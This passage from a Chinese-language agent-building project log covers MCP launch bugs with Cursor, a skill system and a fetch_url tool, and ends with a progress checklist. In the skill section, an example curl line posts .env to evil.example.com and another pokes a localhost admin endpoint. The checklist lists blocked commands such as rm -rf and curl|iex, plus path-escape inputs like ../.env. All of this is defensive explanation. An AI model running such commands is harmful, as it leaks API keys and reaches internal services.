| cwd=项目，不设 `PYTHONPATH` | ✅ |
| **cwd=别的目录，不设 `PYTHONPATH`** | ❌ `No module named mcp_servers`，退出码 1 |
| `uv run --directory <项目>` | ✅ |

**Cursor 3.24 不认配置里的 `cwd` 字段。** 于是子进程从别处启动，import 就失败，
进程退出 → 客户端只说一句「连接已关闭」。

> 这件事最值得记的不是修法，是**误导性**：
> 客户端**不会把子进程的 stderr 显示给你**。「进程没起来」和「协议不兼容」
> 报的是同一个错。你如果第一反应去改协议版本，会一路改错方向。

所以 `mcp_servers/launch.py` 自己算项目路径、自己插 `sys.path`，
**不依赖客户端给的工作目录，也不依赖环境变量**。任何 cwd 都能起来。

顺带修的第二个坑：`initialize` 原来硬回 `2024-11-05`，而 Cursor 3.x 发的是
`2025-06-18`。规范说服务器回自己的版本、客户端不支持就断开 ——
**断开的报错同样是「Connection closed」**，和上面那个长得一模一样。
现在改成客户端要哪个就回哪个（限已知的三个版本），不认识才回退默认值。

#### 验收：Cursor 真能调用

不只是绿灯。在 Cursor 的 Agent 模式里问「用 helloagents 查一下，MCP 的传输方式有哪几种」：

![Cursor 调用 helloagents 的实拍](docs/cursor-mcp-verified.png)

它自己走完了 `search_docs → get_section`，答案带章节号（10.2.3）、
五种传输方式（Memory / Stdio / HTTP / SSE / StreamableHTTP）与原文一致。

**这一步为什么必须做**：自己的 client 连自己的 server，两端可以互相迁就 ——
client 对不规范的字段过度宽容、server 漏发规范要求的字段但 client 不检查，
照样「测试通过」。Cursor 是别人写的、严格按规范解析，它连通才算数。


## 第 5 周 · skill 系统：说明书，不是能力

### 一个关键区别

| | MCP | skill |
|---|---|---|
| 标准化的是 | **能力接口**（有哪些工具、参数是什么） | **用法说明**（什么时候用、按什么顺序做） |
| 换 Agent 能用吗 | 能，协议一样 | **不一定**，说明书里写的动作可能新 Agent 做不到 |

所以 skill 不能跨 Agent 原样搬。这一点在第 5 周被实测证实了（见下）。

### 两层渐进披露

```
第 1 层：每轮都注入「技能名 + 一句话」，约 106 tokens（当前 2 个技能，213 字符）
第 2 层：模型觉得要用 → 调 load_skill("aihot") → 才读 4298 字符的全文
```

对比一下：如果每次把全文都塞进去，2 个技能就要 5400 字符/轮；装 10 个就是几万。
**渐进披露的核心不是省 token，是「让上下文里只出现这次要用的东西」。**

`aihot` 还给了一份 `references/`（3 个文件）—— 那是第 3 层：连全文里都不用一次读完。

### 为什么 skill 要新增工具，而不是放宽 `run_shell` 白名单

WorkBuddy 那 63 个 skill 里，有 46 个的核心动作都是同一句：

```bash
curl -s "https://feeds.bbci.co.uk/news/world/rss.xml"
```

而本项目的 `run_shell` 白名单是 `{echo, date, time, dir, ls, pwd}` —— **没有 curl**。

最省事的修法是往白名单里加 `curl`。**那等于把沙箱拆了**：

```bash
curl -d @.env https://evil.example.com   # 一行就把 API Key 发出去
curl http://127.0.0.1:8080/admin         # 戳本机服务
```

正确做法是**新增一条刚好够用的能力**：`fetch_url`。

| 约束 | 值 |
|---|---|
| 方法 | 只有 GET |
| 协议 | 只有 http / https |
| 目标地址 | 拒绝内网、回环、链路本地（含云 metadata `169.254.169.254`） |
| 重定向 | **手动跟，每一跳重新校验**（自动跟会被 302 跳进内网绕过检查） |
| 返回大小 | 单次最多 2 MB，给模型最多 15000 字符 |

8 条 SSRF 用例全部拒绝。

**这是全项目最通用的一条经验：安全边界不够用时，不要放宽它，要新开一条更窄的路。**

### 注入位置：和长期记忆一样，属于「背景」

```
[原始 system, 长期记忆, 技能目录, ...对话]
               第 1 位    第 2 位
```

理由和第 3 周的长期记忆完全相同 —— **越靠后越「新」**，插在最后会被模型当成这一轮的新指令。

## 进度

- [x] **阶段 0**：`stage0_check.py` 跑通，能打印模型回复与 token 用量
- [x] **第 1 周**：`agent/llm.py` + `agent/loop.py` + `cli.py`，多轮对话 + 流式
  - [x] `agent/llm.py` —— 模型调用封装
  - [x] `agent/loop.py` —— 主循环（两处 TODO 已补齐）
  - [x] `cli.py` —— 命令行入口
  - [x] 单轮对话跑通
  - [x] 多轮对话跑通（模型记得前两句）
  - [x] 流式输出跑通
  - [x] `/reset` 后确实失忆（验证「记忆 = messages 列表」）
- [x] **第 2 周**：`agent/tools/`，模型能自主调工具（v0.3）
  - [x] `agent/tools/base.py` —— 工具基类 + Schema 生成
  - [x] `agent/tools/registry.py` —— 注册表 + 自动发现
  - [x] `agent/tools/get_time.py` —— 第一个工具
  - [x] `llm.py` 支持 `tools` 与 `tool_calls`
  - [x] `cli.py` 加 `--tools` 开关
  - [x] `loop.py` 的 `run_with_tools()`（3 处 TODO 已补齐）
  - [x] 问「现在几点」能自动调 `get_time`
  - [x] 坏 JSON 不崩溃（`ToolCall.parsed_arguments()` 兜底）
  - [x] `max_iterations` 能拦住死循环（实测调用 3 次即停）
  - [x] `read_file` 工具 —— 路径校验 + 敏感文件拒绝（TODO ① 已补）
  - [x] `run_shell` 工具 —— 白名单 + 超时 + 固定工作目录（TODO ② 已补）
  - [x] 路径逃逸全部被拒（`../.env` / `..\..\.env` / `/etc/passwd` / `C:\Windows\...`）
  - [x] 项目内敏感文件被拒（`.env` / `.git/` / `.venv/`）—— 路径限制挡不住这层
  - [x] 危险命令全部被拒（`del` / `rm -rf` / `curl|iex` / `format` / `reg` / `powershell`）
  - [x] 白名单大小写与 `.exe` 归一化（`ECHO` / `dir.exe`）

  > 上面两条「被拒」是**工具层强制**的，与模型自己愿不愿意调无关。
  > 实测模型有时会主动拒绝危险请求，但那是它「觉得」不安全，不是「不能」——
  > **安全必须由工具层兜底，不能指望模型自觉。**
- [x] **第 3 周**：`agent/session.py`，程序重启能接着聊（v0.4）
  - [x] `agent/session.py` —— JSONL 读写（`append()` / `messages()` 两处 TODO 已补齐）
  - [x] `loop.py` —— `load_session()` / `flush_session()` + `_flushed` 计数器
  - [x] `cli.py` —— `--sessions` / `--resume` / `--new-session` + `/history`
  - [x] `data/` 已进 `.gitignore`（`git check-ignore -v` 验证命中）
  - [x] 重启程序后能接着上次聊（实测 3 次启动，输入 token 28 → 56 → **75**）
  - [x] 坏行只坏一行（注入非法 JSON，后续内容完好）
  - [x] `tool_calls` / `tool_call_id` 往返不丢
  - [x] `flush_session()` 不重复写（无新消息时文件字节数不变）
- [x] **第 3 周 · 上下文裁剪**：`agent/context.py`，长对话不再爆窗口（v0.5）
  - [x] `context.py` —— 双水位线 + `estimate_tokens()` + `needs_compaction()`
  - [x] `summarize_early()` —— 早期消息压成一条 `role="system"` 的摘要
  - [x] `compact()` —— 切三段 + 组装 `[system, 摘要, 最近...]`
  - [x] `loop.py` —— `_view()`，`self.messages` 与「发送视图」分离
  - [x] 压缩失败时降级为全量发送（不拖垮对话）
  - [x] `cli.py` —— `--no-compact` / `/tokens` / `/compact`
  - [x] **原始 `messages` 未被修改**（最重要的验收点：视图 ≠ 删数据）
  - [x] 真对话实测触发压缩：14 → 10 条，第 8 轮输入 token 从约 290 降到 **175**
  - [x] 摘要内容是人话，压缩后仍记得「旭在做狮山大学城改造项目」
- [x] **第 3 周 · 长期记忆**：`agent/memory.py`，跨会话记得住（v0.6）
  - [x] `agent/memory.py` —— `MEMORY.md` 读写（`load()` / `append()` 两处 TODO 已补齐）
  - [x] `loop.py` —— `load_memory()` / `remember()` / `_inject_memory()`
  - [x] **记忆注入在第 1 位**（原始 system 之后、一切对话之前）
  - [x] `cli.py` —— `--no-memory` / `/memory` / `/remember <内容>`
  - [x] `MEMORY.md` 已进 `.gitignore`（含个人信息，不能上 Git）
  - [x] 离线验收 41 项全过（含「load() 不创建文件」「append() 拦空行」「原列表未被修改」）
  - [x] **跨会话实测**：会话 A 说过 → 全新会话 B 答得出「你叫旭」
  - [x] 关掉 memory 后谁都答不出（证明起作用的是 memory，不是别的）
  - [x] 未写入 `MEMORY.md` 的事实跨会话记不住（**边界，预期行为**）

  > **session vs memory 的根本区别**：
  > session 恢复的是「同一个会话」；memory 跨「所有会话」。
  > 你曾经 `/resume` 回去却答不出名字 —— 那次是**新会话**，
  > 而且「名字」这种东西永不变，不该靠每次压缩去赌它还在不在。
- [x] **配置化 `agent/config.py`**：改 JSON 换模型，不用改代码（v0.7）
  - [x] `agent/config.py` —— `load_raw()` / `resolve()`（两处 TODO 已补齐）
  - [x] `config.json` —— `fast` / `deepseek` 两套预设，**进 Git**
  - [x] `llm.py` —— `load_config()` 改为包装 `config.resolve()`，**三个调用方一行未改**
  - [x] `.env.example` 精简为「只剩 API Key」（模型参数已搬去 config.json）
  - [x] `cli.py` —— `--profile` / `--profiles` / `/config`
  - [x] `.gitignore` 无需改动（`git check-ignore` 验证 `config.json` 会正常进 Git）

  > `reset()` 故意**不**清磁盘文件：文件是历史流水账，不是聊天窗口。
  > 清空窗口 ≠ 删除聊天记录 —— 所以 `/reset` 后接着写，旧记录仍在。
- [x] **第 4 周**：从脚本变成项目（v0.8 → v0.11.0）
  - [x] `server.py` —— FastAPI（会话池 + 线程池 + SSE）
  - [x] `web/index.html` —— 原生 JS 聊天页，不引 Node 构建链
  - [x] `agent/metrics.py` —— 三段耗时 / token / 错误，JSONL 落盘
  - [x] `/api/metrics` 聚合 + `/api/metrics/raw` 明细
  - [x] 工具调用接入 Web 分两步：先非流式跑通（`452efa7`），再补分片归并（`0c2e400`）
  - [x] 工具并发（`ThreadPoolExecutor` + `pool.map` 保序）
  - [x] 连接池复用 `httpx.Client`：948.7ms → 1.2ms
  - [x] 83 条测试全绿；用变异测试验证过断言不空转（把切片改坏，保序测试立刻红）
  - [x] 打包 v0.11.0：`uv build` 产物含两个 `console_scripts`
  - [x] 复盘 nanobot 的 `loop.py` / `runner.py` → `docs/review-nanobot.md`
- [x] **第 4 周扩展 · MCP client**（`ff724c6`，1085 行）
  - [x] `agent/mcp/`：`protocol.py` / `client.py` / `tool.py` / `host.py`
  - [x] 响应按 `id` 配对 —— 假 server 故意在响应前插一条通知来锁死这个行为
  - [x] 三个传输层坑：`readline` 无超时 / `stderr` 无人读会卡死子进程 / Windows `.cmd` 包裹
  - [x] `loop.py` 只多一个 `mcp_servers` 参数 —— 内核不知道 MCP 存在
  - [x] 真实 filesystem server 端到端：14 个工具，模型自主调 2 个，6.8s
  - [x] **安全实测：MCP 绕过了本地敏感文件的四层边界**（见上文）
- [x] **第 5 周 · 自己的 MCP server**（`314f9ca`）
  - [x] `mcp_servers/` 独立进程，不 import `agent/`
  - [x] 635 个小节 / SQLite FTS5 trigram / 4 个工具两级检索
  - [x] 端到端：模型自主调 4 次工具，6.9s，答案精确到小节号
- [x] **第 5 周 · skill 系统 + `fetch_url`**（`602821c`）
  - [x] `agent/skills.py` —— 两层渐进披露（目录 106 tokens，全文按需读）
  - [x] `agent/tools/fetch_url.py` —— 只读 GET + SSRF 防护，替代 `curl`
  - [x] `agent/tools/load_skill.py` —— 按需读说明书全文
  - [x] `skills/aihot` + `skills/news-summary` 两个技能
  - [x] 端到端：模型自主 `load_skill` → `fetch_url` → 按格式出中文简报，15.5s / 8 条
- [x] **`pytest` 全绿：83 passed**
- [ ] **已知局限（诚实清单）**
  - [ ] wheel 里**不含** `web/index.html` —— 只影响 `pip install` 分发，`uv run` 不受影响
  - [ ] HTTP 层**零鉴权** —— 只能在本机用，不能直接暴露到公网
  - [ ] `_agents` 会话池没有 TTL，长期跑会一直占内存
  - [ ] 撞上 `max_iterations` 时，工具结果在 `messages` 里但用户拿不到 —— 正确做法是再发一次不带 `tools` 的请求收尾
  - [ ] 界面缺 Markdown 渲染 / 代码高亮 / 停止按钮（简报里的列表现在是 `- ` 原始符号）
